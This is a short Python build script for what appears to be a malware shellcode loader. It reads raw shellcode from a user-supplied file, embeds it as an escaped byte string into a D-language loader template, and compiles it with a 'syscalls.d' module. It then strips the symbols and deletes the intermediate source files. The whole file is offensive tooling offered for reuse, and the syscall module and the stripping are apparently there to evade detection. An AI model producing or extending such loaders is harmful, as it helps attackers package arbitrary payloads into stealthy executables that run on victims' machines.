import os

def read_source():
    with open("loader.d", "rt") as source:
        data = source.read()
    return data

def read_shellcode():
    with open("main.bin", "rb") as payload: # replace main.bin with yours. 
        data = payload.read()
    return data

def main():
    source = read_source()
    payload = read_shellcode()
    format_payload = '"\\x' + '\\x'.join(format(x, '02x') for x in payload) + '"'
    new_code = source.replace('string shellcode = "your shc here";', f'string shellcode = {format_payload};')
    with open("loader_new.d", "w+") as pwn:
        pwn.write(new_code)
    os.system("dmd loader_new.d -i syscalls.d -release")
    if os.path.exists("loader_new.exe"):
        os.system("strip --strip-all loader_new.exe")
        os.system("del loader_new.obj")
        os.system("del loader_new.d")
    else:
        print("Error: 'loader_new.exe' does not exist. Please create it before stripping.")

if __name__ == "__main__":
    main()
